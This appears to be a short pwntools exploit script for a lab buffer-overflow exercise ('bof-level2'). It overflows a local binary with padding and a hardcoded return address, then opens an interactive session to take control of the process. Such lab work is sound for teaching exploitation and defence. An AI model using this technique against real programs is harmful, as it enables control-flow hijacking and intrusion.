#!/usr/bin/env python

from pwn import *

p = process('/home/labs/week2/bof-level2/bof-level2')

buffer = "A"*20 + "ABCDEFGH" + "AAAAAAAA" + "\x30\x85\x04\x08"


p.sendline(buffer)
p.interactive()
